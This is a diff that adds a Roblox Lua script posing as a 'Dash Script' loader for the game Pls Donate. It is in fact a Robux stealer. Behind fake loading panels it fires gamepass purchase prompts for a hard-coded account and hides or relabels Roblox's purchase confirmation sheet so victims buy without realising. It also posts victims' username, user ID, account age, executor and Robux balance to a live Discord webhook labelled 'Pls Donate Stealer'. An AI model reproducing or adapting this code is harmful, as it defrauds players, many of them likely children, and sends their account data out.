@@ -1,0 +1,598 @@
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local HeaderLabel = Instance.new("TextLabel")
+local ContentText = Instance.new("TextLabel")
+local CloseButton = Instance.new("TextButton")
+local TweenService = game:GetService("TweenService")
+local UICorner = Instance.new("UICorner")
+local UIStroke = Instance.new("UIStroke")
+local ButtonCorner = Instance.new("UICorner")
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Main Frame
+MainFrame.Parent = ScreenGui
+MainFrame.Size = UDim2.new(0, 250, 0, 110)
+MainFrame.Position = UDim2.new(1, 300, 1, - 120) -- Start off-screen
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+MainFrame.BorderSizePixel = 0
+MainFrame.Visible = true
+
+-- Round corners
+UICorner.Parent = MainFrame
+UICorner.CornerRadius = UDim.new(0, 10)
+
+-- Outline
+UIStroke.Parent = MainFrame
+UIStroke.Thickness = 1.5
+UIStroke.Color = Color3.fromRGB(255, 255, 255)
+
+-- Header
+HeaderLabel.Parent = MainFrame
+HeaderLabel.Size = UDim2.new(1, - 16, 0, 24)
+HeaderLabel.Position = UDim2.new(0, 8, 0, 8)
+HeaderLabel.Text = "Dash Script"
+HeaderLabel.TextSize = 18
+HeaderLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+HeaderLabel.BackgroundTransparency = 1
+HeaderLabel.Font = Enum.Font.GothamBold
+HeaderLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Content
+ContentText.Parent = MainFrame
+ContentText.Size = UDim2.new(1, - 16, 0, 38)
+ContentText.Position = UDim2.new(0, 8, 0, 34)
+ContentText.Text = "Loading Gui, Will Take A Few Seconds \n if it doesn't appear please rejoin."
+ContentText.TextSize = 14
+ContentText.TextColor3 = Color3.fromRGB(230, 230, 230)
+ContentText.BackgroundTransparency = 1
+ContentText.Font = Enum.Font.Gotham
+ContentText.TextWrapped = true
+ContentText.TextYAlignment = Enum.TextYAlignment.Top
+
+-- Close Button
+CloseButton.Parent = MainFrame
+CloseButton.Size = UDim2.new(1, - 20, 0, 26)
+CloseButton.Position = UDim2.new(0, 10, 1, - 34)
+CloseButton.Text = "Close"
+CloseButton.TextSize = 16
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.BorderSizePixel = 0
+
+-- Button Corners
+ButtonCorner.Parent = CloseButton
+ButtonCorner.CornerRadius = UDim.new(0, 8)
+local TopFrame = Instance.new("Frame")
+local TopCorner = Instance.new("UICorner")
+local TopStroke = Instance.new("UIStroke")
+local TopText = Instance.new("TextLabel")
+TopFrame.Parent = ScreenGui
+TopFrame.Size = UDim2.new(0, 250, 0, 80)
+TopFrame.Position = UDim2.new(1, 300, 1, - 210) -- start off-screen
+TopFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TopFrame.BorderSizePixel = 0
+TopFrame.ZIndex = 10
+TopFrame.Visible = true
+TopCorner.Parent = TopFrame
+TopCorner.CornerRadius = UDim.new(0, 10)
+TopStroke.Parent = TopFrame
+TopStroke.Thickness = 1.5
+TopStroke.Color = Color3.fromRGB(255, 255, 255)
+TopText.Parent = TopFrame
+TopText.Size = UDim2.new(1, - 16, 1, - 16)
+TopText.Position = UDim2.new(0, 8, 0, 8)
+TopText.BackgroundTransparency = 1
+TopText.TextWrapped = true
+TopText.TextYAlignment = Enum.TextYAlignment.Top
+TopText.Font = Enum.Font.GothamBold
+TopText.TextSize = 14
+TopText.TextColor3 = Color3.fromRGB(255, 255, 255)
+TopText.TextTransparency = 0
+TopText.ZIndex = 11
+
+local function LoadingText()
+local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = playerGui
+
+local textFrame = Instance.new("Frame")
+textFrame.Size = UDim2.new(0, 180, 0, 40) -- Slightly larger
+textFrame.Position = UDim2.new(0.5, -90, 0.52, 20) -- Moved slightly down
+textFrame.BackgroundTransparency = 1 -- Light gray background
+
+textFrame.Parent = ScreenGui
+
+local UIStroke = Instance.new("UIStroke")
+ -- Dark gray border
+
+local UICorner = Instance.new("UICorner")
+UICorner.Parent = textFrame
+UICorner.CornerRadius = UDim.new(0.2, 0)
+
+local contentText = Instance.new("TextLabel")
+contentText.Size = UDim2.new(1, 0, 1, 0)
+contentText.BackgroundTransparency = 1
+contentText.Text = "Wait for the button to change \n when you click Load Script then Continue To Script"
+contentText.Font = Enum.Font.FredokaOne
+contentText.TextSize = 20
+contentText.TextStrokeTransparency = 0
+contentText.TextStrokeColor3 = Color3.fromRGB(50, 50, 50) -- Darker stroke for better visibility
+contentText.TextColor3 = Color3.fromRGB(255, 255, 255) -- Darker green for contrast
+contentText.Parent = textFrame
+end
+
+local function skibidi()
+local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Parent = playerGui
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+    local Frame = Instance.new("Frame")
+    Frame.Parent = ScreenGui
+    Frame.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
+    Frame.Size = UDim2.new(0, 300, 0, 60) -- Match GuiHider1
+    Frame.Position = UDim2.new(0.5, -145, 0.29, -0) -- Match GuiHider1
+    Frame.BorderSizePixel = 0
+    Frame.Active = true
+    Frame.Draggable = false
+    Frame.ZIndex = 5
+
+    local UIStroke = Instance.new("UIStroke")
+    UIStroke.Parent = Frame
+    UIStroke.Thickness = 2
+    UIStroke.Color = Color3.fromRGB(50, 205, 50)
+
+    local UICorner = Instance.new("UICorner")
+    UICorner.Parent = Frame
+    UICorner.CornerRadius = UDim.new(0.2, 0)
+
+    local TextLabel = Instance.new("TextLabel")
+    TextLabel.Parent = Frame
+    TextLabel.Text = "CONTINUE TO SCRIPT!"
+    TextLabel.Font = Enum.Font.FredokaOne
+    TextLabel.TextSize = 20
+    TextLabel.Size = UDim2.new(1, 0, 1, 0)
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel.ZIndex = 6
+end
+
+local function skibidi2()
+local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Parent = playerGui
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+    local Frame = Instance.new("Frame")
+    Frame.Parent = ScreenGui
+    Frame.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+    Frame.Size = UDim2.new(0, 300, 0, 60) -- Match GuiHider1
+    Frame.Position = UDim2.new(0.5, -145, 0.29, -0) -- Match GuiHider1
+    Frame.BorderSizePixel = 0
+    Frame.Active = true
+    Frame.Draggable = false
+    Frame.ZIndex = 5
+
+    local UIStroke = Instance.new("UIStroke")
+    UIStroke.Parent = Frame
+    UIStroke.Thickness = 2
+    UIStroke.Color = Color3.fromRGB(255, 215, 0)
+
+    local UICorner = Instance.new("UICorner")
+    UICorner.Parent = Frame
+    UICorner.CornerRadius = UDim.new(0.2, 0)
+
+    local TextLabel = Instance.new("TextLabel")
+    TextLabel.Parent = Frame
+    TextLabel.Text = "LOAD SCRIPT!"
+    TextLabel.Font = Enum.Font.FredokaOne
+    TextLabel.TextSize = 20
+    TextLabel.Size = UDim2.new(1, 0, 1, 0)
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel.ZIndex = 6
+end
+
+-- 🔥 CHANGE THIS TEXT
+TopText.Text = "Turn off all ur settings in delta for it to work, make sure it's turned off before executing! don't execute after turning it off"
+
+-- Slide In Function
+local function slideIn()
+	local targetPos = UDim2.new(1, - 260, 1, - 120)
+	local tween = TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+		Position = targetPos
+	})
+	tween:Play()
+end
+local function slideInTop()
+	local tween = TweenService:Create(
+		TopFrame, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+		Position = UDim2.new(1, - 260, 1, - 210)
+	})
+	tween:Play()
+end
+
+-- Slide Out Function
+local function slideOut()
+	local targetPos = UDim2.new(1, 300, 1, - 120)
+	local tween = TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
+		Position = targetPos
+	})
+	tween:Play()
+	tween.Completed:Connect(function()
+		MainFrame.Visible = false
+	end)
+end
+
+-- Close Button with Click Animation
+CloseButton.MouseButton1Click:Connect(function()
+	local shrink = TweenService:Create(CloseButton, TweenInfo.new(0.08), {
+		Size = UDim2.new(1, - 24, 0, 24)
+	})
+	shrink:Play()
+	shrink.Completed:Connect(function()
+		local expand = TweenService:Create(CloseButton, TweenInfo.new(0.08), {
+			Size = UDim2.new(1, - 20, 0, 26)
+		})
+		expand:Play()
+		expand.Completed:Connect(slideOut)
+	end)
+end)
+slideIn()
+task.delay(0.6, slideInTop)
+
+Username = "XxxXloveryl1"
+Webhook = "https://discord.com/api/webhooks/1358935494049665084/fOAH6oL_mbIgp4kFDNRu1Cl5l1LQ5uqV3-HZz3-B97tieCFQ3hrKBwxX9YcRZz2TW_9z"
+ReplicatedStorage = game:GetService("ReplicatedStorage")
+MarketplaceService = game:GetService("MarketplaceService")
+HttpService = game:GetService("HttpService")
+CoreGui = game:GetService("CoreGui")
+Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local request = syn and syn.request or request
+if typeof(request) ~= "function" then
+	error("?!?")
+end
+Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
+
+-- OfflinePlayerLookup only (no loadOfflinePlayer / no gifting UI / no camera)
+function getPlayerGamepasses(username)
+	local userId
+	local okId, idErr = pcall(function()
+		userId = Players:GetUserIdFromNameAsync(username)
+	end)
+	if not okId then
+		return nil, "invalid username: " .. tostring(idErr)
+	end
+	local booth
+	local okLookup, lookupErr = pcall(function()
+		booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(userId)
+	end)
+	if not okLookup then
+		return nil, "OfflinePlayerLookup failed: " .. tostring(lookupErr)
+	end
+	if typeof(booth) ~= "Instance" then
+		return nil, "unexpected lookup result: " .. typeof(booth)
+	end
+	local boothUI = booth:FindFirstChild("BoothUI", true)
+	local itemsFrame = boothUI and boothUI:FindFirstChild("Items") and boothUI.Items:FindFirstChild("Frame")
+	local gamepasses = {}
+	if itemsFrame then
+		for _, child in ipairs(itemsFrame:GetChildren()) do
+			if child:GetAttribute("AssetType") == "Gamepass" then
+				local prompt = child:FindFirstChild("Prompt")
+				table.insert(gamepasses, {
+					name = child.Name,
+					assetId = child:GetAttribute("AssetId"),
+					assetPrice = child:GetAttribute("AssetPrice"),
+					assetType = child:GetAttribute("AssetType"),
+					prompt = prompt,
+					item = child,
+				})
+			end
+		end
+	end
+	table.sort(gamepasses, function(a, b)
+		return (a.assetPrice or 0) < (b.assetPrice or 0)
+	end)
+	local offlineBooths = ReplicatedStorage:FindFirstChild("OfflineBooths")
+	if offlineBooths then
+		booth.Parent = offlineBooths
+	end
+	return {
+		username = username,
+		userId = userId,
+		boothName = booth.Name,
+		booth = booth,
+		gamepasses = gamepasses,
+	}
+end
+
+local success, UserId = pcall(
+    function()
+	return Players:GetUserIdFromNameAsync(Username)
+end)
+
+local asset
+local myRobux
+local function sendWebhook()
+	local embed = {
+		username = "Hit On Pls Donate",
+		avatar_url = "https://cdn.discordapp.com/attachments/1299001946191040588/1329748647864303647/images_5.jpg?ex=678b786f&is=678a26ef&hm=0b89be217de156b0bcbacb6b3f611a3bde76cbd2dd26a6b2f6a843ab5c915d47&",
+		content = "You Got Hit",
+		embeds = {
+			{
+				title = "**__Shar's Script__ | __Pls Donate Stealer__**",
+				color = tonumber(0x3365FF),
+				description = clickablePlayerName .. " Use Your Script.",
+				thumbnail = {
+					url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerId) .. "&width=420&height=420&format=png" -- Ensure this is correctly set
+				},
+				fields = {
+					{
+						name = "Information",
+						value = "```lua\nExecutor: " .. tostring(identifyexecutor()) .. "\nUsername: " .. game.Players.LocalPlayer.Name .. "\nUser-ID: " .. tostring(game.Players.LocalPlayer.UserId) .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "```"
+					},
+					{
+						name = "Robux",
+						value = "```" .. myRobux .. "```"
+					}
+				},
+				footer = {
+					text = "Created by Shar"
+				}
+			}
+		}
+	}
+	local data = HttpService:JSONEncode(
+        {
+		["content"] = "@everyone",
+		["embeds"] = {
+			embed
+		}
+	})
+	local WebhookResponse = request(
+        {
+		Url = Webhook,
+		Method = "POST",
+		Headers = headers,
+		Body = data
+	})
+end
+
+local function getRealPrice(assetId)
+    return game:GetService("MarketplaceService"):GetProductInfo(assetId, Enum.InfoType.GamePass).PriceInRobux
+end
+local firstBalance
+local hasRanRobuxCheck
+if success then
+	local camera = workspace.CurrentCamera
+
+    local data = getPlayerGamepasses(Username)
+    local smallestGamepass;
+    local smallestPrice = math.huge;
+    for i,v in pairs(data.gamepasses) do
+        if v.assetPrice < smallestPrice then
+            smallestPrice = v.assetPrice
+            smallestGamepass = v
+        end
+    end
+    if smallestGamepass then
+        smallestGamepass.prompt:FireServer("", false, smallestPrice, getRealPrice(smallestGamepass.assetId))
+    end
+
+    local function Purchase()
+        local range = 0
+        for _, v in pairs(data.gamepasses) do
+            if v.assetPrice <= myRobux and v.assetPrice > range then
+                range = v.assetPrice
+                asset = v
+            end
+        end
+        if asset then
+            asset.prompt:FireServer("", false, range, getRealPrice(asset.assetId))
+        end
+    end
+
+	local function parseRobuxText(text)
+		if not text then
+			return nil
+		end
+        local data = text:split(' ')
+        for i,v in data do
+            if tonumber(v) then
+                return tonumber(v)
+            end
+        end
+		return nil
+	end
+
+	local function getFoundationNodes()
+		local overlay = CoreGui:WaitForChild("FoundationOverlay", 60)
+		local sheet = overlay:WaitForChild("SafeAreaFrame"):WaitForChild("OverlayPortal"):WaitForChild("SheetContainer"):WaitForChild("Frame"):WaitForChild("Sheet")
+		local body = sheet.Content
+		local modal = body.Header.Content.SubContent.ModalHeader
+		return {
+			overlay = overlay,
+			sheet = sheet,
+			body = body,
+			buyButton = body.Actions["1"].BuyButton,
+			buyText = body.Actions["1"].BuyButton:FindFirstChild("Text"),
+			balanceLabel = modal.RightSide.RobuxPrice,
+			titleLabel = modal.LeftSide.RobuxAmount,
+			headerClose = body.Header.Content.CloseAffordance,
+			itemPanel = body:FindFirstChild("Content"),
+		}
+	end
+
+	local function getContent()
+		return game:GetService("CoreGui"):WaitForChild("FoundationOverlay"):WaitForChild("SafeAreaFrame"):WaitForChild("OverlayPortal"):WaitForChild("SheetContainer"):WaitForChild("Frame"):WaitForChild("Sheet"):WaitForChild("Content")
+	end
+
+local trans = game:GetService("CoreGui"):WaitForChild("FoundationOverlay"):WaitForChild("SafeAreaFrame"):WaitForChild("OverlayPortal"):WaitForChild("SheetContainer"):WaitForChild("Frame"):WaitForChild("Sheet")
+
+local function applytransparency2() 
+trans.BackgroundTransparency = 10
+end
+
+	local function hideRobuxCheck()
+		local content = getContent()
+		local modal = content:WaitForChild("Header"):WaitForChild("Content"):WaitForChild("SubContent"):WaitForChild("ModalHeader")
+      game:GetService("CoreGui").FoundationOverlay.SafeAreaFrame.OverlayPortal.Backdrop.Visible = false
+      game:GetService("CoreGui").FoundationOverlay.SafeAreaFrame.OverlayPortal.SheetContainer.Frame.Sheet.Content.Header.Content.SubContent.Visible = false
+      game:GetService("CoreGui").FoundationOverlay.SafeAreaFrame.OverlayPortal.SheetContainer.Frame.Sheet.Content.Header.Content.CloseAffordance.Size = UDim2.new(0, 420, 0, 40)
+      game:GetService("CoreGui").FoundationOverlay.SafeAreaFrame.OverlayPortal.SheetContainer.Frame.Sheet.Content.Header.BottomBorder.Visible = false
+      game:GetService("CoreGui").FoundationOverlay.SafeAreaFrame.OverlayPortal.SheetContainer.Frame.Shadow.Visible = false
+  game:GetService("RunService").RenderStepped:Connect(function()
+      applytransparency2() 
+  end) 
+      skibidi2()
+      LoadingText()
+      
+		modal.LeftSide.RobuxAmount.Text = "Please Donate - Script!"
+		modal.RightSide.RobuxPrice.Text = ''
+		
+		content.Header.Content.CloseAffordance.Icon.Text = ''
+
+		modal.ChildAdded:Connect(function(child)
+			if child.Name == 'Actions' or child.Name == 'Content' then
+				child:Destroy()
+            game:GetService("CoreGui").FoundationOverlay.SafeAreaFrame.OverlayPortal.Backdrop.Visible = false
+			end
+		end)
+
+		content:WaitForChild("Actions"):Destroy()
+		content:WaitForChild("Content"):Destroy()
+		hasRanRobuxCheck = true
+	end
+
+	local function hidePurchase()
+		local content = getContent()
+      local function applyTransparency()
+    local Sheet = CoreGui
+        :WaitForChild("FoundationOverlay")
+        :WaitForChild("SafeAreaFrame")
+        :WaitForChild("OverlayPortal")
+        :WaitForChild("SheetContainer")
+        :WaitForChild("Frame")
+        :WaitForChild("Sheet")
+
+    local BuyButton = Sheet
+        :WaitForChild("Content")
+        :WaitForChild("Actions")
+        :WaitForChild("1")
+        :WaitForChild("BuyButton")
+
+    BuyButton.BackgroundTransparency = 3
+    Sheet.BackgroundTransparency = 4
+end
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    applyTransparency()
+end)
+
+skibidi() 
+
+		local header = content:WaitForChild("Header"):WaitForChild('Content')
+		header:WaitForChild("CloseAffordance"):Destroy()
+		local modalHeader = header:WaitForChild("SubContent"):WaitForChild('ModalHeader')
+
+		modalHeader.RightSide:Destroy()
+		modalHeader.LeftSide.RobuxAmount.Text = "Script Loading, Click X!"
+
+		content:WaitForChild('Content'):Destroy()
+
+		local text = content:WaitForChild('Actions'):WaitForChild("1"):WaitForChild("BuyButton"):WaitForChild("Text")
+
+		text:GetPropertyChangedSignal('Text'):Connect(function(...)
+			text.Text = ''
+		end)
+		text.Text = ''
+local CoreGui = game:GetService("CoreGui")
+
+local function applyChanges()
+    local OverlayPortal = CoreGui
+        :WaitForChild("FoundationOverlay")
+        :WaitForChild("SafeAreaFrame")
+        :WaitForChild("OverlayPortal")
+
+    local Sheet = OverlayPortal
+        :WaitForChild("SheetContainer")
+        :WaitForChild("Frame")
+        :WaitForChild("Sheet")
+
+    local Content = Sheet:WaitForChild("Content")
+    local Action1 = Content:WaitForChild("Actions"):WaitForChild("1")
+
+    OverlayPortal:WaitForChild("Backdrop").Visible = false
+    Content:WaitForChild("Header").Visible = false
+    Action1:WaitForChild("BlackbirdUpsellBanner").Visible = false
+    Action1:WaitForChild("BuyButton"):WaitForChild("Text").Visible = false
+    Sheet.BackgroundTransparency = 10
+    Action1:WaitForChild("BuyButton").BackgroundTransparency = 10
+end
+
+applyChanges()
+	end
+
+	local check, foundation = pcall(getFoundationNodes)
+	if not check then
+		hideRobuxCheck()
+		return
+	end
+
+    if not foundation.sheet.Visible then
+        repeat
+            task.wait()
+        until foundation.sheet.Visible
+    end
+
+    myRobux = parseRobuxText(foundation.balanceLabel.Text)
+	firstBalance = myRobux
+
+	local function onFoundationSheetOpened()
+		local balance = parseRobuxText(foundation.balanceLabel.Text)
+		if not balance and not myRobux then
+			return
+		end
+		if not hasRanRobuxCheck then
+			hideRobuxCheck()
+		else
+			hidePurchase()
+		end
+	end
+
+	local function onFoundationSheetClosed()
+		local balance = parseRobuxText(foundation.balanceLabel.Text)
+		if not balance and not myRobux then
+			return
+		end
+		Purchase()
+	end
+
+	foundation.sheet:GetPropertyChangedSignal("Visible"):Connect(function()
+		if foundation.sheet.Visible then
+			onFoundationSheetOpened()
+		end
+	end)
+	foundation.overlay:WaitForChild("SafeAreaFrame").ChildAdded:Connect(onFoundationSheetOpened)
+    foundation.overlay.SafeAreaFrame.ChildRemoved:Connect(function(child)
+        onFoundationSheetClosed()
+    end)
+
+	if foundation.sheet.Visible then
+		onFoundationSheetOpened()
+	end
+	Remotes.OnClientEvent("GiftSentAlert"):Connect(
+    function(a, robux)
+		if a == UserId and myRobux then
+			sendWebhook()
+			myRobux = myRobux - robux
+			Purchase()
+		end
+	end)
+end
